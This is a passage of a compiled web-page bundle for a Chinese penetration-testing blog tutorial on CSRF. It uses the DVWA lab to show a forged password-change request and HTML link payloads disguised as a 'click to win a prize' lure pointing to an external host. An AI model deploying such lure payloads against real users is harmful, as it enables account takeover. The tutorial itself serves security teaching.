style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;http://burpsuite/show/4/mzeu3hmxur1v9r0m4mf44md8qglhej5n&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">点击中大奖</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;/</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">a</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;&lt;</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">div</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="'+e+'" alt="image" tabindex="0" loading="lazy"><figcaption>image</figcaption></figure></li><li><p>当用户点击该链接，用户密码就会被修改</p><figure><img src="'+p+'" alt="image" tabindex="0" loading="lazy"><figcaption>image</figcaption></figure><figure><img src="'+k+'" alt="image" tabindex="0" loading="lazy"><figcaption>image</figcaption></figure></li><li><p>刚才是请求bp代理的服务，如果将链接放到公网，只要用户点击会被改密</p><figure><img src="'+r+'" alt="image" tabindex="0" loading="lazy"><figcaption>image</figcaption></figure><div class="language-php line-numbers-mode" data-highlighter="shiki" data-ext="php" data-title="php" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">payload：</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;/</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">div</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;&lt;</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">a</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;"> href</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;http://47.113.187.190:90/dvwa_csrf+xss.html&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">点击中大奖</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;/</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">a</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;&lt;</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">div</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div></li></ol>',44)]))}]]),B=JSON.parse('{"path":"/perm/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/CSRF%E6%BC%8F%E6%B4%9E.html","title":"CSRF","lang":"zh-CN","frontmatter":{"title":"CSRF","index":true,"icon":"r","isOriginal":true,"date":"2023-03-25T00:00:00.000Z","order":7,"category":["渗透测试"],"tag":["渗透测试","CSRF"],"description":"跨站请求伪造(Cross-site request forgery,CSRF)是一种攻击，它强制终端用户在当前对其进行<span data-type=\\"text\\" style=\\"color: var(--b3-font-color9);\\">身份验证后的Web应用程序 上执行非本意的操作<span>。CSRF攻击的着重点在伪造更改状态的请求，而不是盗取数...","head":[["meta",{"property":"og:url","content":"https://mister-hope.github.io/blog/perm/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/CSRF%E6%BC%8F%E6%B4%9E.html"}],["meta",{"property":"og:site_name","content":"卷卷"}],["meta",{"property":"og:title","content":"CSRF"}],["meta",{"property":"og:description","content":"跨站请求伪造(Cross-site request forgery,CSRF)是一种攻击，它强制终端用户在当前对其进行<span data-type=\\"text\\" style=\\"color: var(--b3-font-color9);\\">身份验证后的Web应用程序 上执行非本意的操作<span>。CSRF攻击的着重点在伪造更改状态的请求，而不是盗取数..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-01-12T08:22:33.000Z"}],["meta",{"property":"article:tag","content":"渗透测试"}],["meta",{"property":"article:tag","content":"CSRF"}],["meta",{"property":"article:published_time","content":"2023-03-25T00:00:00.000Z"}],["meta",{"property":"article:modified_time","content":"2025-01-12T08:22:33.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"CSRF\\",\\"image\\":[\\"\\"],\\"datePublished\\":\\"2023-03-25T00:00:00.000Z\\",\\"dateModified\\":\\"2025-01-12T08:22:33.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"卷卷\\"}]}"]]},"headers":[{"level":3,"title":"CSRF漏洞的原理","slug":"csrf漏洞的原理","link":"#csrf漏洞的原理","children":[]},{"level":3,"title":"防御措施","slug":"防御措施","link":"#防御措施","children":[]},{"level":3,"title":"把token放置在cookiet中，能否防护csrf","slug":"把token放置在cookiet中-能否防护csrf","link":"#把token放置在cookiet中-能否防护csrf","children":[]},{"level":3,"title":"CSRF需不需要获取cookie","slug":"csrf需不需要获取cookie","link":"#csrf需不需要获取cookie","children":[]},{"level":3,"title":"CSRF与XSS的区别","slug":"csrf与xss的区别","link":"#csrf与xss的区别","children":[]},{"level":3,"title":"同源策略","slug":"同源策略","link":"#同源策略","children":[]},{"level":3,"title":"跨域","slug":"跨域","link":"#跨域","children":[]},{"level":3,"title":"跨域方法","slug":"跨域方法","link":"#跨域方法","children":[]},{"level":3,"title":"DVWA中利用XSS漏洞和csrf漏洞修改密码","slug":"dvwa中利用xss漏洞和csrf漏洞修改密码","link":"#dvwa中利用xss漏洞和csrf漏洞修改密码","children":[]}],"git":{"createdTime":1736670153000,"updatedTime":1736670153000,"contributors":[{"name":"youze","username":"youze","email":"youze27@163.com","commits":1,"url":"https://github.com/youze"}]},"readingTime":{"minutes":5.9,"words":1771},"filePathRelative":"perm/漏洞专题/CSRF漏洞.md","localizedDate":"2023年3月25日","excerpt":"<p>跨站请求伪造(Cross-site request forgery,CSRF)是一种攻击，它强制终端用户在当前对其进行&lt;span data-type=\\"text\\" style=\\"color: var(--b3-font-color9);\\"&gt;身份验证后的Web应用程序<br>\\n上执行非本意的操作&lt;span&gt;。CSRF攻击的着重点在伪造更改状态的请求，而不是盗取数据，因为攻击者无法查看对伪造请求的响应</p>\\n<h3>CSRF漏洞的原理</h3>\\n<p>(用DVWA举例)</p>\\n<ol>\\n<li>\\n<p><code>47.113.187.190:36974/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change</code>这个网站在用户修改个人的信息时没有过多的校验，导致这个请求容易被伪造。</p>\\n</li>\\n<li>\\n<p>目的：我们可以伪造请求，修改他人信息</p>\\n<p>条件：<span data-type=\\"text\\" style=\\"color: var(--b3-font-color9);\\">1.对方也登陆的该网站  2.对方点击了链接触发修改信息的伪请求</span>（二者缺一不可）</p>\\n</li>\\n</ol>","autoDesc":true}')}}]);